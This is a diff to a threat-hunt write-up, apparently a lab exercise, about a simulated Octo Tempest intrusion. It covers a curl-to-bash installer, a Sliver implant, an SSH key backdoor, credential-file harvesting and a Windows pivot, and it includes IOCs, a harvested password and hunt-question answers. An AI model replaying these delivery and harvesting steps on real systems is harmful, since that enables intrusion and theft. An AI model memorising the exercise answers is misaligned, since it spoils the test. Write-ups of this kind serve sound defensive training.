@@ -1,38 +1,40 @@
 
-# Ghost in the Stack
 
-<img width="1400" height="321" alt="image" src="https://github.com/user-attachments/assets/e68ffbe5-e7da-4f04-b729-7058bf343e79" />
+# 👻 Ghost in the Stack
+
+<img width="1423" height="342" alt="image" src="https://github.com/user-attachments/assets/42953f11-50b5-466b-a370-1dca6df2f511" />
 <br>
+
 
 ---
 
 <details>
 <summary><strong>Contents</strong></summary>
 
-- [Executive Summary](#executive-summary)
-- [Key Impact Metrics](#key-impact-metrics)
-- [Environment](#environment)
-- [Host Inventory](#host-inventory)
-- [Attack Narrative](#attack-narrative)
-- [Attack Flow (at a glance)](#attack-flow-at-a-glance)
-- [Attack Timeline](#attack-timeline)
-- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
-- [Cyber Kill Chain](#cyber-kill-chain)
-- [Indicators of Compromise](#indicators-of-compromise)
+- [📝 Executive Summary](#-executive-summary)
+- [🚨 Key Impact Metrics](#-key-impact-metrics)
+- [🏗️ Environment](#️-environment)
+- [🖥️ Host Inventory](#️-host-inventory)
+- [📖 Attack Narrative](#-attack-narrative)
+- [🔀 Attack Flow (at a glance)](#-attack-flow-at-a-glance)
+- [⏱️ Attack Timeline](#️-attack-timeline)
+- [🗺️ MITRE ATT&CK Mapping](#️-mitre-attck-mapping)
+- [🔗 Cyber Kill Chain](#-cyber-kill-chain)
+- [🚨 Indicators of Compromise](#-indicators-of-compromise)
 - Hunt Phases
-  - [Phase 00 — Mission Brief](#phase-00--mission-brief)
-  - [Phase 01 — Inheritance (Scoping the Environment)](#phase-01--inheritance-scoping-the-environment)
-  - [Phase 02 — Reconstruction (Implant Behaviour)](#phase-02--reconstruction-implant-behaviour)
-  - [Phase 03 — Attribution](#phase-03--attribution)
-  - [Phase 04 — First Pivot (Linux to Windows)](#phase-04--first-pivot-linux-to-windows)
-  - [Phase 05 — Second Pivot (Windows Payload Delivery)](#phase-05--second-pivot-windows-payload-delivery)
-  - [Phase 06 — Aftermath (Containment and Detection Engineering)](#phase-06--aftermath-containment-and-detection-engineering)
+  - [📋 Phase 00 — Mission Brief](#-phase-00--mission-brief)
+  - [🔍 Phase 01 — Inheritance (Scoping the Environment)](#-phase-01--inheritance-scoping-the-environment)
+  - [🧬 Phase 02 — Reconstruction (Implant Behaviour)](#-phase-02--reconstruction-implant-behaviour)
+  - [🕵️ Phase 03 — Attribution](#️-phase-03--attribution)
+  - [↔️ Phase 04 — First Pivot (Linux to Windows)](#️-phase-04--first-pivot-linux-to-windows)
+  - [🎯 Phase 05 — Second Pivot (Windows Payload Delivery)](#-phase-05--second-pivot-windows-payload-delivery)
+  - [🛡️ Phase 06 — Aftermath (Containment and Detection Engineering)](#️-phase-06--aftermath-containment-and-detection-engineering)
 
 </details>
 
 ---
 
-## Executive Summary
+## 📝 Executive Summary
 
 Octo Tempest, a financially motivated threat actor known for aggressive social engineering and cross-platform intrusion, established a persistent foothold on Linux workstation `GF-DEV01` within the Greenfield engineering environment on April 30, 2026. The initial compromise was trivial: user `a.kumar` executed a single curl-to-bash command from their shell at 21:54 UTC, fetching and running an installer from `dl.abordsecurity.space` (hosted behind Cloudflare CDN). The installer dropped `/tmp/helix-update` — a Sliver C2 implant — which detached from its parent process chain via nohup and continued running as PID 34616 under PPID 1. An existing SOC alert (CLOSED-5) had flagged the install domain as a suspicious DNS lookup minutes earlier but was dismissed as baseline activity.
 
@@ -44,7 +46,7 @@ At end-of-hunt, the Sliver implant remained running on GF-DEV01, the SSH backdoo
 
 ---
 
-## Key Impact Metrics
+## 🚨 Key Impact Metrics
 
 | Metric | Value |
 |---|---|
@@ -60,7 +62,7 @@ At end-of-hunt, the Sliver implant remained running on GF-DEV01, the SSH backdoo
 
 ---
 
-## Environment
+## 🏗️ Environment
 
 | Field | Value |
 |---|---|
@@ -73,7 +75,7 @@ At end-of-hunt, the Sliver implant remained running on GF-DEV01, the SSH backdoo
 
 ---
 
-## Host Inventory
+## 🖥️ Host Inventory
 
 | Host | Internal IP | OS | Role | Accounts Active | Notes |
 |---|---|---|---|---|---|
@@ -83,7 +85,7 @@ At end-of-hunt, the Sliver implant remained running on GF-DEV01, the SSH backdoo
 
 ---
 
-## Attack Narrative
+## 📖 Attack Narrative
 
 At 21:54:56 UTC on April 30, 2026, user `a.kumar` ran a single command from their shell on `GF-DEV01`:
 
@@ -121,7 +123,7 @@ At 00:21:07 UTC on May 1, sancadmin probed the C2 infrastructure directly: `curl
 
 ---
 
-## Attack Flow (at a glance)
+## 🔀 Attack Flow (at a glance)
 
 ```
 ┌──────────────────────┐                               ┌────────────────────────┐
@@ -160,7 +162,7 @@ At 00:21:07 UTC on May 1, sancadmin probed the C2 infrastructure directly: `curl
 
 ---
 
-## Attack Timeline
+## ⏱️ Attack Timeline
 
 | Time (UTC) | Phase | Event |
 |---|---|---|
@@ -180,55 +182,55 @@ At 00:21:07 UTC on May 1, sancadmin probed the C2 infrastructure directly: `curl
 
 ---
 
-## MITRE ATT&CK Mapping
+## 🗺️ MITRE ATT&CK Mapping
 
 | Tactic | Technique | ID | Evidence |
 |---|---|---|---|
-| Initial Access | Command and Scripting Interpreter: Unix Shell | T1059.004 | `curl -fsSL … \| bash` — shell-based installer delivery |
-| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | `nohup /tmp/helix-update` — implant launched via shell |
-| Execution | Native API | T1106 | Sliver implant uses direct syscalls (openat, connect) recorded via auditd |
-| Persistence | SSH Authorized Keys | T1098.004 | `octotempest@operator` public key appended to `authorized_keys` |
-| Persistence | Create or Modify System Process: Systemd Service | T1543.002 | `/etc/systemd/system/helix-sync.service` created for ligolo (dormant) |
-| Defense Evasion | Masquerading | T1036 | `helix-update`, `helix-sync` binary names mimic legitimate update tooling; nohup detach reparents implant to PID 1, hiding it from session-based process trees |
-| Credential Access | Unsecured Credentials: Private Keys | T1552.004 | `ssh_user_keys` audit key — `~/.ssh/config` accessed for SSH credentials |
-| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 | `aws_creds`, `kubectl:kube_creds`, `claude_data` audit keys — implant reads credential files |
-| Discovery | Account Discovery | T1087 | SAMR enumeration on GF-WS01 post-RDP |
-| Defense Evasion | Valid Accounts: Domain Accounts | T1078.002 | Implant-driven `t.harris` LogonType 3 failure-then-success pattern against GF-WS01 — using harvested valid creds to evade detection during pre-pivot validation |
-| Lateral Movement | Remote Services: SSH | T1021.004 | SSH port forward via GF-DEV01 tunnelling RDP to GF-WS01 |
-| Lateral Movement | Remote Services: Remote Desktop Protocol | T1021.001 | `t.harris` RDP to GF-WS01 at 23:47 |
-| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 | smbclient targeting `C$\Windows\Temp` (attempted, failed) |
-| Lateral Movement | Windows Management Instrumentation | T1047 | `wmi_exec.py` (attempted, failed) |
-| Lateral Movement | Remote Services: Windows Remote Management | T1021.006 | `pwsh Invoke-Command` port 5985 (attempted, failed) |
-| Command and Control | Protocol Tunneling | T1572 | SSH local port forward proxying attacker's RDP through GF-DEV01 |
-| Command and Control | Application Layer Protocol | T1071 | Sliver C2 beacon to `194.36.110.139` via child processes |
+| 🚀 Initial Access | Command and Scripting Interpreter: Unix Shell | T1059.004 | `curl -fsSL … \| bash` — shell-based installer delivery |
+| ⚡ Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | `nohup /tmp/helix-update` — implant launched via shell |
+| ⚡ Execution | Native API | T1106 | Sliver implant uses direct syscalls (openat, connect) recorded via auditd |
+| 🔐 Persistence | SSH Authorized Keys | T1098.004 | `octotempest@operator` public key appended to `authorized_keys` |
+| 🔐 Persistence | Create or Modify System Process: Systemd Service | T1543.002 | `/etc/systemd/system/helix-sync.service` created for ligolo (dormant) |
+| 🎭 Defense Evasion | Masquerading | T1036 | `helix-update`, `helix-sync` binary names mimic legitimate update tooling; nohup detach reparents implant to PID 1, hiding it from session-based process trees |
+| 🔑 Credential Access | Unsecured Credentials: Private Keys | T1552.004 | `ssh_user_keys` audit key — `~/.ssh/config` accessed for SSH credentials |
+| 🔑 Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 | `aws_creds`, `kubectl:kube_creds`, `claude_data` audit keys — implant reads credential files |
+| 🔎 Discovery | Account Discovery | T1087 | SAMR enumeration on GF-WS01 post-RDP |
+| 🎭 Defense Evasion | Valid Accounts: Domain Accounts | T1078.002 | Implant-driven `t.harris` LogonType 3 failure-then-success pattern against GF-WS01 — using harvested valid creds to evade detection during pre-pivot validation |
+| ➡️ Lateral Movement | Remote Services: SSH | T1021.004 | SSH port forward via GF-DEV01 tunnelling RDP to GF-WS01 |
+| ➡️ Lateral Movement | Remote Services: Remote Desktop Protocol | T1021.001 | `t.harris` RDP to GF-WS01 at 23:47 |
+| ➡️ Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 | smbclient targeting `C$\Windows\Temp` (attempted, failed) |
+| ➡️ Lateral Movement | Windows Management Instrumentation | T1047 | `wmi_exec.py` (attempted, failed) |
+| ➡️ Lateral Movement | Remote Services: Windows Remote Management | T1021.006 | `pwsh Invoke-Command` port 5985 (attempted, failed) |
+| 📡 Command and Control | Protocol Tunneling | T1572 | SSH local port forward proxying attacker's RDP through GF-DEV01 |
+| 📡 Command and Control | Application Layer Protocol | T1071 | Sliver C2 beacon to `194.36.110.139` via child processes |
 
 ---
 
-## Cyber Kill Chain
+## 🔗 Cyber Kill Chain
 
 | Phase | Activity | Hunt Flags |
 |---|---|---|
-| Reconnaissance | Octo Tempest identified `a.kumar` and GF-DEV01 credentials; built `dl.abordsecurity.space` installer infrastructure on AS9009 (M247) | Q14, Q16 |
-| Weaponisation | Compiled Sliver C2 implant (`helix-update`); hosted `install.sh` on Cloudflare CDN-fronted domain | — |
-| Delivery | `a.kumar` executed `curl -fsSL … \| bash` from shell — user-initiated, no exploit required | Q02, Q05, Q29 |
-| Exploitation | `install.sh` executed: `chmod`, `nohup` launch; implant detaches from process tree as PPID 1 | Q03–Q05, Q07 |
-| Installation | SSH `authorized_keys` backdoor injected with `octotempest@operator` key; `helix-sync.service` systemd unit created; tools staged via SFTP | Q12–Q13, Q15, Q28, Q38 |
-| Command & Control | Sliver C2 child PIDs beam out to `194.36.110.139`; sancadmin SSH session from same IP at 23:39 — anomalous `SrcIpAddr` is the discriminator | Q08–Q09, Q26, Q30, Q37 |
-| Actions on Objective | Credential harvesting (`aws_creds`, `ssh_user_keys`, `kube_creds`, `claude_data`); Windows pivot via port-forward + RDP; lateral movement attempted and failed | Q10–Q11, Q17, Q19–Q25, Q39–Q40 |
+| 1️⃣ Reconnaissance | Octo Tempest identified `a.kumar` and GF-DEV01 credentials; built `dl.abordsecurity.space` installer infrastructure on AS9009 (M247) | Q14, Q16 |
+| 2️⃣ Weaponisation | Compiled Sliver C2 implant (`helix-update`); hosted `install.sh` on Cloudflare CDN-fronted domain | — |
+| 3️⃣ Delivery | `a.kumar` executed `curl -fsSL … \| bash` from shell — user-initiated, no exploit required | Q02, Q05, Q29 |
+| 4️⃣ Exploitation | `install.sh` executed: `chmod`, `nohup` launch; implant detaches from process tree as PPID 1 | Q03–Q05, Q07 |
+| 5️⃣ Installation | SSH `authorized_keys` backdoor injected with `octotempest@operator` key; `helix-sync.service` systemd unit created; tools staged via SFTP | Q12–Q13, Q15, Q28, Q38 |
+| 6️⃣ Command & Control | Sliver C2 child PIDs beam out to `194.36.110.139`; sancadmin SSH session from same IP at 23:39 — anomalous `SrcIpAddr` is the discriminator | Q08–Q09, Q26, Q30, Q37 |
+| 7️⃣ Actions on Objective | Credential harvesting (`aws_creds`, `ssh_user_keys`, `kube_creds`, `claude_data`); Windows pivot via port-forward + RDP; lateral movement attempted and failed | Q10–Q11, Q17, Q19–Q25, Q39–Q40 |
 
 > Post-hunt response and detection-engineering questions (Q00, Q01, Q06, Q18, Q27, Q31–Q34, Q36, Q41) sit outside the kill chain proper — they cover schema awareness, alert closure analysis, containment ordering, Sigma authoring, and end-state characterisation.
 
 ---
 
-## Indicators of Compromise
+## 🚨 Indicators of Compromise
 
-**Infrastructure:**
+**🌐 Infrastructure:**
 - C2 IP: `194.36.110.139` (AS9009, M247 Europe SRL)
 - C2 Port: `9080` (HTTP probe confirmed active)
 - Installer Domain: `dl.abordsecurity.space` (Cloudflare CDN, fronted at `104.21.57.185`)
 - Windows Payload Domain: `sync.abordsecurity.space`
 
-**Files and Artefacts:**
+**📁 Files and Artefacts:**
 - `/tmp/helix-update` — Sliver C2 implant (running, PID 34616)
 - `/tmp/helix-sync` — Ligolo tunnel proxy (staged via SFTP)
 - `/usr/local/bin/helix-sync` — Ligolo binary (detected: `HackTool:Linux/Ligolo.A!MTB`)
@@ -237,19 +239,19 @@ At 00:21:07 UTC on May 1, sancadmin probed the C2 infrastructure directly: `curl
 - `/tmp/wmi_exec.py` — WMI lateral movement helper
 - `/home/a.kumar/.ssh/authorized_keys` — modified with `octotempest@operator` key
 
-**Network Indicators:**
+**📡 Network Indicators:**
 - C2 subprocess PIDs (process-level): `34739, 34935, 34956, 35250, 43047`
 - Attacker SSH source IP: `194.36.110.139` (sancadmin, dst port 22)
 - Attacker Kali internal source IP: `10.1.0.119` (RDP client reaching GF-WS01 via the SSH local port forward on GF-DEV01)
 - Windows payload download URL: `https://sync.abordsecurity.space/helix-build-agent.exe`
 
-**Account and Credential Indicators:**
+**🔑 Account and Credential Indicators:**
 - Compromised account (initial): `a.kumar` on GF-DEV01
 - Attacker-used account: `sancadmin` (SSH from `194.36.110.139`)
 - Exfiltrated credentials: `greenfield.local/t.harris%Summer2025!`
 - Backdoor SSH key comment: `octotempest@operator`
 
-**Detection Artefacts:**
+**🚨 Detection Artefacts:**
 - CLOSED-5: DNS alert on `dl.abordsecurity.space` (21:50–22:05) — false-negative closure
 - CLOSED-1 through CLOSED-4: Triggered simultaneously at 23:47 on `t.harris` RDP landing
 - TKT-003: sancadmin external SSH from `194.36.110.139`
@@ -276,7 +278,7 @@ Key table gotchas:
 
 ---
 
-## Phase 00 — Mission Brief
+## 📋 Phase 00 — Mission Brief
 
 <details>
 <summary><strong>Q00 — Environment Access · <code>Tier-2 hunter ready</code></strong></summary>
@@ -294,7 +296,7 @@ The gate phrase was embedded in the briefing's format hint. No query required.
 
 ---
 
-## Phase 01 — Inheritance (Scoping the Environment)
+## 🔍 Phase 01 — Inheritance (Scoping the Environment)
 
 <details>
 <summary><strong>Q01 — Scoping · <code>LinuxAuth_CL</code></strong></summary>
@@ -419,7 +421,7 @@ Reviewed the T2 Case File briefing document provided with the hunt. The briefing
 
 ---
 
-## Phase 02 — Reconstruction (Implant Behaviour)
+## 🧬 Phase 02 — Reconstruction (Implant Behaviour)
 
 <details>
 <summary><strong>Q07 — Reconstruction · <code>34616/1</code></strong></summary>
@@ -576,7 +578,7 @@ Schema inspection across both tables. `LinuxProcess_CL` uses `ActorUsername` for
 
 ---
 
-## Phase 03 — Attribution
+## 🕵️ Phase 03 — Attribution
 
 <details>
 <summary><strong>Q12 — Pivot · <code>ssh_user_keys</code></strong></summary>
@@ -712,7 +714,7 @@ All prior sancadmin sessions showed internal `SrcIpAddr` values. The TKT-003 ses
 
 ---
 
-## Phase 04 — First Pivot (Linux to Windows)
+## ↔️ Phase 04 — First Pivot (Linux to Windows)
 
 <details>
 <summary><strong>Q17 — Pattern Analysis · <code>credential validation</code></strong></summary>
@@ -793,7 +795,7 @@ The technique name follows the format: `[PROTOCOL]_enumeration` — a direct lab
 
 ---
 
-## Phase 05 — Second Pivot (Windows Payload Delivery)
+## 🎯 Phase 05 — Second Pivot (Windows Payload Delivery)
 
 <details>
 <summary><strong>Q21 — Artefact Recovery · <code>greenfield.local/t.harris%Summer2025!</code></strong></summary>
@@ -991,7 +993,7 @@ The sancadmin shell history shows a two-phase structure. Phase 1 commands focuse
 
 ---
 
-## Phase 06 — Aftermath (Containment and Detection Engineering)
+## 🛡️ Phase 06 — Aftermath (Containment and Detection Engineering)
 
 <details>
 <summary><strong>Q26 — Timeline Analysis · <code>104</code></strong></summary>
@@ -1196,4 +1198,3 @@ The first submission (`hbsync.exe:dormant, helix-sync.service:persistent, helix-
 > **Lesson:** Persistence in the security context means "survives a credential rotation or session termination." An SSH authorized_keys entry with a public key is persistent by definition — it allows login independent of the user's password. A service *file* that exists but has not been enabled is dormant — it cannot auto-start without `systemctl enable`. The distinction matters for containment planning: dormant artefacts can be removed at any time; persistent artefacts must be removed immediately to prevent re-entry.
 
 </details>
-
